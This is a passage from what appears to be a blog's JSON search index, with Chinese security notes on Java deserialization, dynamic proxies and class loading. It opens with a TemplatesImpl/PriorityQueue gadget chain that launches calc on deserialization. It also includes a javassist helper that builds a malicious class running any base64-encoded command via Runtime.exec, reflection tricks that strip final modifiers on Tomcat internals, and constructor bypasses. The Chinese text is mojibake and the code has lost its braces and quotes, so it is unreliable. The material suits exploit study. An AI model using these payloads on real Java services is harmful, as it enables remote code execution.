tfactoryField = tc.getDeclaredField(_tfactory); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer(); InvocationHandler myinvocationhandler = new MyInvocationHandler(); Field typeFiled = MyInvocationHandler.class.getDeclaredField(type); typeFiled.setAccessible(true); typeFiled.set(myinvocationhandler, Templates.class); Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]Comparator.class, myinvocationhandler); PriorityQueue priorityQueue = new PriorityQueue(comparator); Class pc = PriorityQueue.class; Field sizeField = pc.getDeclaredField(size); sizeField.setAccessible(true); sizeField.set(priorityQueue, 2); Field queueField = pc.getDeclaredField(queue); queueField.setAccessible(true); queueField.set(priorityQueue, new Object[]templates,templates); ByteArrayOutputStream bytes = new ByteArrayOutputStream(); ObjectOutputStream out = new ObjectOutputStream(bytes); out.writeUTF(SJTU); out.writeInt(1896); out.writeObject(priorityQueue); System.out.println(Utils.bytesTohexString(bytes.toByteArray())); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readUTF(); objectInputStream.readInt(); objectInputStream.readObject(); æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ å¦‚æœè¯´ç»™invocationHandlerèµ‹å€¼çš„æ—¶å€™ï¼Œtypeå¦‚æœæ˜¯TemplatesImpl.classï¼Œé‚£ä¹ˆä¼šæŠ¥é”™ï¼Œmethodsæ•°ç»„å€¼ä¹Ÿæœ‰å¾ˆå¤š æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åº”è¯¥æ˜¯ç»™typeèµ‹å€¼Templates.classæ‰å¯¹ï¼Œè¿™æ ·å­methodsæ•°ç»„é‡Œé¢å°±åªæœ‰ä¸¤ä¸ªæ–¹æ³•äº† javassistçš„å¦™ç”¨javassistå¯ä»¥åŠ¨æ€ç”Ÿæˆjavaå­—èŠ‚ç ï¼Œå¯ä»¥åœ¨ç¨‹åºè¿è¡Œæ—¶ç”Ÿæˆæ–°çš„ç±» å¯¼å…¥ä¾èµ– dependency groupIdorg.javassist/groupId artifactIdjavassist/artifactId version3.30.2-GA/version/dependency æ›´å…·ä½“çš„æè¿°å¯ä»¥åœ¨ï¼šhttps://cina666.github.io/2025/03/21/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRome/æ‰¾åˆ°ï¼Œè¿™é‡Œå°±ç®€å•æ€»ç»“ä¸€ä¸‹ åˆ›å»ºæ¶æ„ç±»public static byte[] getEvilBytes(String cmd) throws Exception ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(evil); // è®¾ç½®çˆ¶ç±»ä¸º AbstractTranslet CtClass abstractTransletClass = classPool.get(AbstractTranslet.class.getName()); ctClass.setSuperclass(abstractTransletClass); // ç¼–å†™æ¶æ„ä»£ç  String code = + namesArray = new String[]\\hello\\; // åˆå§‹åŒ– namesArray + java.lang.Runtime.getRuntime().exec(new String(java.util.Base64.getDecoder().decode(\\ + cmd + \\))); // æ‰§è¡Œå‘½ä»¤ + ; // åˆ›å»ºæ„é€ å™¨ CtConstructor constructor = new CtConstructor(new CtClass[], ctClass); constructor.setBody( super(); + code + ); // è°ƒç”¨çˆ¶ç±»æ„é€ å™¨ï¼Œå¹¶åˆå§‹åŒ–å­—æ®µ ctClass.addConstructor(constructor); // å†™å…¥å­—èŠ‚ç åˆ°æ–‡ä»¶ ctClass.writeFile(); // è¿”å›å­—èŠ‚ç  return ctClass.toBytecode(); æ›´è¯¦ç»†çš„å¸¸è§ç±»ä»£ç ï¼š ClassPool classPool = ClassPool.getDefault();CtClass ctClass = classPool.makeClass(evil);String code = java.lang.Runtime.getRuntime().exec(\\calc\\);;ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));//è®¾ç½®çˆ¶ç±»CtConstructor constructor = ctClass.makeClassInitializer();//å®šä¹‰ç±»åˆå§‹åŒ–constructor.setBody(System.out.println(\\é™æ€ä»£ç å—å†…\\););constructor.insertBefore(code);//å†™é™æ€ä»£ç å—CtField ctField = new CtField(CtClass.intType,number,ctClass);//è®¾ç½®å±æ€§ctField.setModifiers(Modifier.PUBLIC);//è®¾ç½®å±æ€§çš„ä¿®é¥°ç¬¦ctClass.addField(ctField);CtField ctField1 = new CtField(classPool.get(String.class.getName()),str,ctClass);ctField1.setModifiers(Modifier.PRIVATE);ctClass.addField(ctField1);CtField ctField2 = CtField.make(public int qwq;,ctClass);//å¦ä¸€ç§æ„é€ å±æ€§çš„æ–¹æ³•ï¼Œæ›´æ–¹ä¾¿ctClass.addField(ctField2);CtConstructor constructor1 = new CtConstructor(new CtClass[]classPool.get(String.class.getName()),classPool.get(int.class.getName()),ctClass);constructor1.setBody(this.str = $1; this.number = $2; System.out.println(\\æ„é€ å‡½æ•°å†…\\););ctClass.addConstructor(constructor1);CtMethod ctMethod = CtMethod.make(public int test()return this.number;,ctClass);ctMethod.setModifiers(Modifier.PRIVATE);ctClass.addMethod(ctMethod);ctClass.writeFile(); ä¼šç”Ÿæˆä¸€ä¸ªç±»æ–‡ä»¶ ä¿®æ”¹ç±» ClassPool classPool = ClassPool.getDefault();// CtClass ctClass = classPool.makeClass(evil); CtClass ctClass = classPool.get(org.example.MyInvocationHandlerTest); String code = java.lang.Runtime.getRuntime().exec(\\calc\\);; ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));//è®¾ç½®çˆ¶ç±» CtConstructor constructor = ctClass.makeClassInitializer();//å®šä¹‰ç±»åˆå§‹åŒ– constructor.insertBefore(code);//å†™é™æ€ä»£ç å— ctClass.writeFile(MyInvocationHandlerTestOutPut); ç»•è¿‡æ„é€ å‡½æ•°åˆ›å»ºä¸€ä¸ªå¯¹è±¡é€šè¿‡ReflectionFactoryhttps://www.cnblogs.com/strongmore/p/15470175.html è¿™é‡Œå†™ä¸ªæ–¹æ³•æ–¹ä¾¿ä¹‹åè¿›è¡Œè°ƒç”¨ public static Object createObjWithoutConstructor(Class clazz) throws Exception ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); ConstructorObject constructor = Object.class.getDeclaredConstructor(); Constructor? constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor); constructor1.setAccessible(true); return constructor1.newInstance(); é€šè¿‡Unsafeåœ¨é«˜ç‰ˆæœ¬ä¸­sunåŒ…é‡Œé¢çš„ç±»ç”¨ä¸äº†å¯ä»¥é€šè¿‡åå°„æ¥è¿›è¡Œè°ƒç”¨ é‚£é‡Œé¢çš„ç±»éƒ½æ˜¯å­˜åœ¨çš„ï¼Œä½†æ˜¯JDKåšäº†é™åˆ¶ä¸è®©ç”¨è€Œå·² è¿™é‡Œå†™çš„æ˜¯åå°„è°ƒç”¨Unsafeï¼Œå½“ç„¶ReflectionFactoryä¹Ÿæ˜¯å¯ä»¥çš„ public static T T createObjWithoutConstructor(ClassT c) throws Exception Class? name = Class.forName(sun.misc.Unsafe); Field unsafeField = name.getDeclaredField(theUnsafe); unsafeField.setAccessible(true); Method allocateInstanceMethod = name.getDeclaredMethod(allocateInstance, Class.class); allocateInstanceMethod.setAccessible(true); return (T) allocateInstanceMethod.invoke(unsafeField.get(null),c); åå°„ä¿®æ”¹static finalhttps://blog.csdn.net/qq_37687594/article/details/121317703 ä¾‹å­å¦‚ä¸‹ï¼š //åå°„è·å–æ‰€éœ€å±æ€§Field WRAP_SAME_OBJECT_FIELD = Class.forName(org.apache.catalina.core.ApplicationDispatcher).getDeclaredField(WRAP_SAME_OBJECT);Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(lastServicedRequest);Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(lastServicedResponse); //ä½¿ç”¨modifiersFieldåå°„ä¿®æ”¹finalå‹å˜é‡java.lang.reflect.Field modifiersField = Field.class.getDeclaredField(modifiers);modifiersField.setAccessible(true);modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() ~Modifier.FINAL);modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() ~Modifier.FINAL);modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() ~Modifier.FINAL);WRAP_SAME_OBJECT_FIELD.setAccessible(true);lastServicedRequestField.setAccessible(true);lastServicedResponseField.setAccessible(true); //å°†å˜é‡WRAP_SAME_OBJECT_FIELDè®¾ç½®ä¸ºtrueif (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)) WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);","categories":["Write-Up"]},{"title":"JDKåŠ¨æ€ä»£ç†","path":"/2024/11/06/JDKåŠ¨æ€ä»£ç†/","content":"é™æ€ä»£ç†é¦–å…ˆå®šä¹‰ä¸€ä¸ªæ¥å£ï¼Œå®ç°ç±»ï¼Œä»¥åŠä¸€ä¸ªä»£ç†ç±» package com.sherlock;public interface IUser void show(); package com.sherlock;public class UserImpl implements IUser public UserImpl() @Override public void show() System.out.println(å±•ç¤º); package com.sherlock;public class UserProxy implements IUser IUser user; public UserProxy() public UserProxy(IUser user) this.user = user; @Override public void show() user.show(); System.out.println(è°ƒç”¨äº†show); ä¸‹é¢æˆ‘ä»¬å°±æ¥æµ‹è¯•ä¸€ä¸‹ package com.sherlock;public class ProxyTest public static void main(String[] args) IUser user = new UserImpl(); //é™æ€ä»£ç† IUser userProxy = new UserProxy(user); userProxy.show(); é™æ€ä»£ç†å…¶å®å°±ç›¸å½“äºèµ·åˆ°äº†æ—¥å¿—è®°å½•çš„åŠŸèƒ½ï¼Œæ¯”å¦‚ä¸Šè¿°ä¾‹å­ä¸­æ‰“å°è°ƒç”¨äº†showè¿™å¥è¯ä¸å¯èƒ½åœ¨å®ç°ç±»ä¸­å‡ºç°ï¼Œåªèƒ½å¤Ÿåœ¨ä»£ç†ç±»ä¸­è¾“å‡º ä½†æ˜¯é™æ€ä»£ç†æœ‰ä¸€ä¸ªåŠ£åŠ¿ï¼Œå°±æ˜¯æ¥å£æœ‰æ—¶å€™æ‰€éœ€è¦çš„å®ç°æ–¹æ³•ä¸æ­¢ä¸€ä¸ªï¼Œç„¶åå³ä½¿æ˜¯è¿›è¡Œé‡å¤æ€§çš„æ–¹æ³•ä»£ç†ï¼ˆå¦‚åŒæ ·åŠ å…¥ä¸€ä¸ªè®°å½•æ—¥å¿—çš„åŠŸèƒ½ï¼‰ï¼Œä¹Ÿéœ€è¦åœ¨ä»£ç†ç±»ä¸­æŠŠæ–¹æ³•ä¸€ä¸ªä¸€ä¸ªéƒ½å®ç°äº†ï¼Œè¿‡äºç¹çï¼Œé‚£ä¹ˆè¦æ€ä¹ˆè§£å†³å‘¢ JDKåº•å±‚ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼Œé‚£å°±æ˜¯åŠ¨æ€ä»£ç† åŠ¨æ€ä»£ç†ä¸€ä¸ªé‡è¦çš„æ–¹æ³•ï¼Œç”¨äºä»£ç†ä¸€ä¸ªå¯¹è±¡ï¼š Proxy.newProxyInstance æˆ‘ä»¬è·Ÿè¿›æ–¹æ³•ï¼Œå‚æ•°éœ€è¦ä¸€ä¸ªç±»åŠ è½½å™¨å¯¹è±¡ï¼Œä¸€ä¸ªæ¥å£æ•°ç»„å¯¹è±¡ä»¥åŠä¸€ä¸ªInvocationHandlerå¯¹è±¡ï¼›è¿”å›çš„æ˜¯Objectå¯¹è±¡ å¯¹äºInvocationHandlerå¯¹è±¡ï¼Œé‡å†™ä¸€ä¸‹è¯¥invokeæ–¹æ³•ï¼Œæ­¤å¤„çš„invoke()æ–¹æ³•å°±æ˜¯åœ¨äºè§£å†³é™æ€ä»£ç†ä¸­éœ€è¦é‡å¤é‡å†™æ–¹æ³•çš„ç¼ºé™·ï¼ŒåŠ¨æ€ä»£ç†çš„å¥½å¤„å°±æ˜¯èƒ½è·å–åˆ°å¤–éƒ¨è°ƒç”¨çš„é‚£ä¸ªæ–¹æ³•ï¼Œç„¶åé€šè¿‡åå°„æ¥åˆ°å†…éƒ¨æ¥æ‰§è¡Œè¢«ä»£ç†å¯¹è±¡çš„æ–¹æ³• package com.sherlock;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class UserInvocationHandler implements InvocationHandler IUser user; public UserInvocationHandler(); public UserInvocationHandler(IUser user) this.user = user; //invokeæ–¹æ³•æ€ä¹ˆè·å–åˆ°çš„methodæˆ‘ä»¬ä¸éœ€è¦äº†è§£ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable //æ‰“å°æ‰€è°ƒç”¨çš„æ–¹æ³•å System.out.println(è°ƒç”¨äº†+method.getName()); //userä¸ºæˆ‘ä»¬æ‰€ä»£ç†çš„å¯¹è±¡ method.invoke(user, args); return null; InvocationHandlerä¸­çš„invokeæ–¹æ³•å½“å¤–é¢æœ‰è°ƒç”¨æ–¹æ³•çš„æ—¶å€™éƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œ ç„¶åæˆ‘ä»¬ç®€å•æµ‹è¯•ä¸€ä¸‹ package com.sherlock;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;public class ProxyTest public static void main(String[] args) IUser user = new UserImpl(); //åŠ¨æ€ä»£ç† InvocationHandler userinvocationhandler = new UserInvocationHandler(user); //ä»£ç†äº†userå¯¹è±¡ï¼ŒuserProxyå¯ä»¥åå°„è°ƒç”¨userå¯¹è±¡çš„æ‰€æœ‰æ–¹æ³• IUser userProxy = (IUser)Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),userinvocationhandler); userProxy.update(); å…¶å®newProxyInstanceçš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯è·å–åˆ°ä¸€ä¸ªæ¥å£æ•°ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥å†™æˆä¸‹é¢è¿™ç§æ–¹å¼ IUser userProxy = (IUser)Proxy.newProxyInstance(user.getClass().getClassLoader(), new Class[]IUser.class, userinvocationhandler);","categories":["javaååºåˆ—åŒ–"]},{"title":"javaç±»åŠ è½½","path":"/2024/10/24/javaç±»åŠ è½½/","content":"é™æ€ä»£ç å—çš„æ‰§è¡Œåœ¨ä¸Šæ–‡JDKåŠ¨æ€ä»£ç†çš„ä»£ç ä¸­ï¼Œåœ¨Personç±»å®šä¹‰ä¸­æ·»åŠ ä»¥ä¸‹å‡ ç‚¹ï¼š ä¸€ä¸ªé™æ€å±æ€§idï¼Œä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œä¸€ä¸ªé™æ€ä»£ç å—ï¼Œä¸€ä¸ªæ„é€ ä»£ç å— public static int id;public static void staticAction() System.out.println(é™æ€æ–¹æ³•è°ƒç”¨);static System.out.println(é™æ€ä»£ç å—è°ƒç”¨); System.out.println(æ„é€ ä»£ç å—åˆ©ç”¨); å¯¹é™æ€å±æ€§è°ƒç”¨ï¼Œä¼šè§¦å‘é™æ€ä»£ç å— Person.id = 1; å¯¹é™æ€æ–¹æ³•è°ƒç”¨ï¼Œä¹Ÿä¼šè§¦å‘é™æ€ä»£ç å— Person.staticAction(); å¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ï¼Œä¸¤ç§ä»£ç å—éƒ½è¢«è°ƒç”¨ï¼š new Person(); classçš„è·å–åœ¨javaä¸­ï¼Œè·å–ä¸€ä¸ªç±»çš„classï¼Œæœ‰ä¸‹é¢å‡ ç§æ–¹å¼ï¼š è¿™æ ·åªè¿›è¡Œäº†åŠ è½½ï¼Œæ²¡è¿›è¡Œåˆå§‹åŒ–ï¼Œå› æ­¤æ²¡æœ‰ä»»ä½•è¾“å‡º Class? c = Person.class; ç›´æ¥é€šè¿‡loadClassæ–¹æ³•ä¹Ÿæ²¡è¿›è¡Œåˆå§‹åŒ–ï¼Œæ— è¾“å‡º ClassLoader classLoader = ClassLoader.getSystemClassLoader();Class? c = classLoader.loadClass(com.potato.Entity.Person); è¿™æ ·å°±èƒ½è°ƒç”¨äº†é™æ€ä»£ç å—ï¼Œä¹Ÿå°±æ˜¯è¿›è¡Œäº†åˆå§‹åŒ–çš„æ“ä½œ Class? c = Class.forName(Person); è·Ÿè¿›forNameï¼Œèƒ½å¤Ÿçœ‹åˆ°ä¸‹é¢è°ƒç”¨äº†ä¸ªforName0ï¼ˆå®ƒè¢«è°ƒç”¨æ¥æ‰§è¡ŒçœŸæ­£çš„ç±»åŠ è½½æ“ä½œï¼‰ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°ä¸ºtrueï¼Œæ„å‘³æ˜¯å¦åˆå§‹åŒ–ï¼Œé»˜è®¤forNameä¼ å…¥ä¸€ä¸ªå‚æ•°å°±ä¸ºtrue æˆ‘ä»¬è·Ÿè¿›forName0 ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ˜¯å¦åˆå§‹åŒ–ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ç±»åŠ è½½å™¨ï¼Œç¬¬å››ä¸ªå‚æ•°ä¸æ˜¯å¾ˆé‡è¦ åœ¨Class.javaä¸­ç»§ç»­æŸ¥çœ‹å¯ä»¥å‘ç°è¿˜æœ‰ä¸€ä¸ªé‡è½½çš„forNameï¼ˆå®Œæ•´ç‰ˆï¼‰ é€šè¿‡è¯¥å‡½æ•°æˆ‘ä»¬å¯ä»¥æ§åˆ¶ç±»æ˜¯å¦è¿›è¡Œåˆå§‹åŒ–ï¼Œè·Ÿè¿›ç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥å‘ç°ç±»ClassLoaderæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä¸èƒ½å¤Ÿç›´æ¥è¿›è¡Œå®ä¾‹åŒ– ä½†æ˜¯å…¶æœ‰ä¸€ä¸ªé™æ€æ–¹æ³•getSystemClassLoader()èƒ½è·å–åˆ°ä¸€ä¸ªClassLoaderå¯¹è±¡ äºæ˜¯æˆ‘ä»¬æ¥æµ‹è¯•ï¼Œè‡ªå·±è¾“å…¥ç›¸å…³å‚æ•°ï¼Œä¸è®©ç±»è¿›è¡Œåˆå§‹åŒ–ï¼Œä¹Ÿå°±ä¸ä¼šè°ƒç”¨é™æ€æ–¹æ³• ä½†æ˜¯åªè¦å°†å…¶å®ä¾‹åŒ–ä¹‹åï¼Œå°±éƒ½ä¼šæ­£å¸¸è°ƒç”¨ package com.sherlock;public class ClassLoaderTest public static void main(String[] args) throws Exception // Class.forName(com.sherlock.Person); ClassLoader cl = ClassLoader.getSystemClassLoader(); Class? c = Class.forName(com.sherlock.Person, false, cl); c.newInstance(); loadClassç±»åŠ è½½è¿‡ç¨‹åˆ†æä¸Šé¢æœ‰æåˆ°ä¸€ç§ç±»åŠ è½½çš„æ–¹å¼ï¼Œé€šè¿‡ClassLoaderå¯¹è±¡çš„loadClass()æ–¹æ³•æ¥è¿›è¡Œç±»åŠ è½½ï¼Œå¯¹loadClass()ç±»åŠ è½½çš„åº•å±‚åŸç†è¿›è¡Œæ¢å¯»ï¼Œçœ‹çœ‹å†™åœ¨å…¶ä»–åœ°æ–¹çš„ç±»èƒ½ä¸èƒ½å¤Ÿè¢«åŠ è½½ï¼Œä»è€Œå®ç°ä»»æ„ç±»åŠ è½½ï¼Œå¯ä»¥åšæ›´å¤šçš„äº‹ è®©æˆ‘ä»¬æ¥è°ƒè¯•ä¸€ä¸‹ï¼Œè·Ÿè¿›loadClassæ–¹æ³•ï¼ˆè¿™é‡Œéœ€è¦å¼ºåˆ¶æ­¥å…¥ï¼‰ï¼Œæ¥åˆ°äº†ClassLoaderç±»çš„loadClass()æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›è¿›å» æ¥åˆ°äº†AppClassLoaderç±»ä¸‹çš„loadClass()æ–¹æ³•ï¼Œåœ¨åšäº†ä¸€ç³»åˆ—çš„å®‰å…¨æ£€æŸ¥ä¹‹åï¼Œèµ°åˆ°äº†è°ƒç”¨çˆ¶ç±»çš„loadClass()æ–¹æ³•ï¼Œç•™æ„åˆ°æ­¤å¤„æœ‰ä¸€ä¸ªfindLoadedClass()æ–¹æ³•ï¼Œé€‚ç”¨äºæ£€æµ‹ç±»æ˜¯å¦å·²ç»è¢«åŠ è½½è¿‡äº†ï¼Œè¯¥æ–¹æ³•åœ¨ä¸‹é¢çš„loadClass()æ–¹æ³•ä¸­è¢«å¤§é‡è°ƒç”¨ï¼Œ è¿™é‡Œæš‚åœä¸€ä¸‹ï¼Œè¯¦ç»†ç†è§£ä¸€ä¸‹loadClass()æ–¹æ³•ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯ä¸€å±‚ä¸€å±‚åœ°å‘ä¸Šå§”æ‰˜ï¼Œæ£€æµ‹è¯¥ç±»æ˜¯å¦å·²ç»è¢«åŠ è½½è¿‡ï¼ˆå¯¹åº”ä¸‹æ–‡çš„findLoadedClass()ï¼‰ï¼Œå¦‚æœåŠ è½½è¿‡åˆ™ç›´æ¥è¿”å›ï¼ŒæœªåŠ è½½åˆ™å§”æ‰˜ç»™çˆ¶åŠ è½½å™¨æ¥åŠ è½½ï¼Œé€’å½’åˆ°æœ€é¡¶å±‚çš„åŠ è½½å™¨BootStrap ClassLoaderä¹‹åï¼Œè‹¥æ— æ³•åŠ è½½æ­¤ç±»ï¼Œå†ä¸€å±‚ä¸€å±‚å‘ä¸‹å§”æ´¾ç»™å­ç±»åŠ è½½å™¨æ¥åŠ è½½ æœ€ååˆå›åˆ°äº†é‡è½½çš„loadClassæ–¹æ³•ï¼ˆçˆ¶ç±»çš„ï¼‰ï¼Œæˆ‘ä»¬æ­¥è¿‡è·Ÿè¿›ä¸€ä¸‹åˆ†æï¼Œ410è¡Œè¿™é‡Œæ˜¾ç¤ºæ­¤æ—¶parentè¿˜ä¸æ˜¯nullï¼Œä¹Ÿå°±æ˜¯åŒäº²å§”æ´¾è¿‡ç¨‹ä¸­Application ClassLoaderè¿˜å¾—å‘ä¸Šå¯»æ‰¾Extension ClassLoaderï¼Œè·Ÿè¿›æ­¤å¤„çš„loadClass() è·Ÿè¿›åè¿˜æ˜¯æ¥åˆ°äº†ClassLoaderç±»çš„loadClass()æ–¹æ³•ä¸‹ï¼Œä½†æ˜¯æ­¤æ—¶thiså·²ç»å˜æˆäº†ExtClassLoaderäº† parentæ— æ³•å†æ‰¾åˆ°äº†ï¼Œç›´æ¥è°ƒbootstrapClassLoaderï¼Œæ­¥å…¥è·Ÿè¿›åˆ°æœ€åæ˜¯ä¸ªnativeåº•å±‚æ–¹æ³•ï¼Œç›´æ¥æ­¥è¿‡ï¼Œä¹Ÿæ˜¯çœ‹åˆ°cæ˜¯nullï¼Œæœªåœ¨\\libä¸‹åŠ è½½å‡ºPersonç±»ï¼Œæ­¤æ—¶bootstrapç±»åŠ è½½å™¨å·²ç»æ— æ³•åŠ è½½Personç±»äº†ï¼Œéœ€è¦å°†å…¶å§”æ´¾ç»™å­ç±»åŠ è½½å™¨æ¥åŠ è½½äº†ï¼Œä»£ç ç»§ç»­å‘ä¸‹æ‰§è¡Œ æ¥åˆ°äº†æ­¤å¤„çš„ä¸€ä¸ªfindClass()æ–¹æ³•ï¼Œå†å¯¹findClass()æ–¹æ³•åšä¸ªè¯¦ç»†ç‚¹çš„ç†è§£ï¼ŒfindClass()çš„ä¸»è¦åŠŸèƒ½å°±æ˜¯æ‰¾åˆ°å¯¹åº”çš„classæ–‡ä»¶ï¼Œç„¶åå°†classæ–‡ä»¶è¯»å…¥å†…å­˜ä¸­è½¬æ¢ä¸ºå­—èŠ‚ç ä¼ é€’ç»™åé¢å°†å‡ºç°çš„defineClass()ï¼Œå¾—åˆ°Classå¯¹è±¡ æˆ‘ä»¬å¼ºåˆ¶æ­¥å…¥çœ‹çœ‹è¯¥å‡½æ•°ï¼Œæˆ‘ä»¬ä¼šå‘ç°è·‘åˆ°äº†URLClassLoaderç±»ä¸‹çš„findClasså‡½æ•°ã€‚ä¸ºä»€ä¹ˆå‘¢ è¿™æ˜¯å› ä¸ºä¸Šé¢çš„findClass()ç¨å¾®è·Ÿè¿›ä¸€ä¸‹ï¼Œæ˜¯ClassLoaderä¸­ä¸€ä¸ªéœ€è¦è¢«é‡å†™çš„æ–¹æ³•ï¼Œæœ¬èº«éƒ½æ²¡æœ‰åšå®šä¹‰ï¼Œåœ¨ExtClassLoaderä¸­è°ƒç”¨çš„æ—¶å€™ä¼šå‘çˆ¶ç±»å¯»æ‰¾findClass()ï¼Œè¿™å‡ ä¸ªç±»çš„ç»§æ‰¿å…³ç³»æ˜¯ClassLoader-SecureClassLoader-URLClassLoader-AppClassLoaderExtClassLoaderï¼Œå› æ­¤æœ€ç»ˆä¹Ÿæ˜¯è°ƒç”¨äº†URLClassLoaderçš„æ–¹æ³• ç¬¬ä¸€æ¬¡ExtClassLoaderè¿›è¡ŒfindClassæœªèƒ½è·å–åˆ°classæ–‡ä»¶ï¼Œç»§ç»­å‘ä¸‹å§”æ´¾ï¼ˆè¿›å…¥è¿™ä¸ªdoPrivileged()æ–¹æ³•éœ€è¦â€å¼ºåˆ¶æ­¥å…¥â€-â€æ­¥è¿‡â€-â€å¼ºåˆ¶æ­¥å…¥â€-â€æ­¥å…¥â€ï¼‰ åˆ°AppClassLoaderï¼Œå†æ¬¡æ­¥å…¥findClass()æ–¹æ³•ï¼Œæ­¤æ—¶èƒ½å¤Ÿçœ‹åˆ°ucpå·²ç»ä»è·¯å¾„ä¸­è¯»å–åˆ°classæ–‡ä»¶ï¼Œreså°†ä¼ å…¥ä¸‹é¢çš„defineClass()æ–¹æ³•è¿›è¡Œç±»åŠ è½½ï¼Œç»§ç»­è·Ÿè¿› URLClassLoaderå¯¹defineClass()æ–¹æ³•è¿›è¡Œäº†ä¸€ä¸ªé‡å†™ï¼Œå‰é¢çš„å¤§éƒ¨åˆ†ä»£ç éƒ½æ˜¯åšäº†ä¸€äº›å®‰å…¨åˆ¤æ–­ï¼Œä»¥åŠä»resè·å–å­—èŠ‚ç­‰çš„åŠŸèƒ½ï¼Œæœ€é‡è¦çš„åœ¨äºæœ€åä¸€è¡Œä¸­è°ƒç”¨çš„å¦ä¸€ä¸ªæ ¼å¼é‡å†™çš„defineClass()æ–¹æ³•ï¼Œè·Ÿè¿›ä¸€ä¸‹ åˆæ¥åˆ°äº†URLClassLoaderçš„çˆ¶ç±»SecureClassLoaderï¼Œè°ƒç”¨å…¶ä¸­é‡å†™çš„defineClass() ç»§ç»­è·Ÿè¿›è¯¥defineClass()æ–¹æ³•ï¼Œé‡æ–°å›åˆ°ClassLoaderä¸­ï¼Œæ­¤æ—¶å„ç§èµ„æºï¼ŒåŒ…æ‹¬classæ–‡ä»¶çš„è·¯å¾„ï¼Œå­—èŠ‚ç ç­‰å‡å‡†å¤‡å°±ç»ªï¼Œä¸‹æ–¹è°ƒç”¨äº†ä¸€ä¸ªdefineClass1()æ–¹æ³• åœ¨ç±»ä¸­æ‰¾åˆ°defineClass1()çš„å®šä¹‰ï¼Œæ˜¯ä¸€ä¸ªnativeæ–¹æ³•ï¼Œæ— æ³•ç»§ç»­è·Ÿè¿›äº†ï¼Œå®é™…ä¸Šæœ€åå°±æ˜¯åœ¨è¿™ä¸ªåœ°æ–¹å®Œæˆäº†ç±»çš„åŠ¨æ€åŠ è½½ï¼Œåˆ†æä¸€ä¸‹å‚æ•°ï¼Œä¼ å…¥ä¸€ä¸ªç±»åï¼Œä¸€ä¸ªç±»æ–‡ä»¶çš„å­—èŠ‚ç ï¼Œç„¶åä»å­—èŠ‚ç ä¸­è·å–åˆ°è¿™ä¸ªç±» è·å–åˆ°classä¹‹åï¼Œè‡ªä¸Šå‘ä¸‹çš„å§”æ´¾æˆåŠŸäº†ï¼Œå› æ­¤ä¸€æ­¥æ­¥åœ°è¿”å›ï¼Œè¿”å›åˆ°findClasså¤„ï¼Œå·²ç»æˆåŠŸè·å–åˆ°ä¸€ä¸ªClasså¯¹è±¡äº†ï¼Œåç»­æ­¥è¿‡è‡³ç»“æŸï¼ŒæˆåŠŸå®Œæˆç±»åŠ è½½ æ€»ç»“ä¸€ä¸‹ï¼Œå…¶å®å°±æ˜¯ ClassLoader-SecureClassLoader-URLClassLoader-AppClassLoader loadClass-findClass(é‡å†™çš„æ–¹æ³•)-defineClass(ä»å­—èŠ‚ç åŠ è½½ç±») URLClassLoaderåŠ¨æ€ç±»åŠ è½½å…¶å®å°±æ˜¯å¯ä»¥é€šè¿‡è¾“å…¥ä¸€ä¸ªURLå®ç°ç±»åŠ è½½ é¦–å…ˆæˆ‘ä»¬æ–°å»ºä¸€ä¸ªç±»æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š import java.io.IOException;public class Test static try Runtime.getRuntime().exec(calc); catch (IOException e) throw new RuntimeException(e); ç„¶åå°†æ–‡ä»¶ç¼–è¯‘åå¯ä»¥åœ¨targetç›®å½•ä¸‹é¢æ‰¾åˆ°æ–‡ä»¶Test.classï¼Œå°†è¯¥æ–‡ä»¶å‰ªè´´è‡³æˆ‘è‡ªå·±åˆ›å»ºçš„ç›®å½•tmpä¸‹é¢ åˆ©ç”¨URLClassLoaderè¿›è¡Œç±»åŠ è½½ï¼Œå¹¶å®ä¾‹åŒ–åå¯ä»¥å¼¹å‡ºè®¡ç®—æœº ï¼ˆæ­¤å¤„åˆ‡è®°ä¼ å…¥å‚æ•°ç»“å°¾éœ€è¦æ˜¯ä¸¤æ¡åæ–œæ 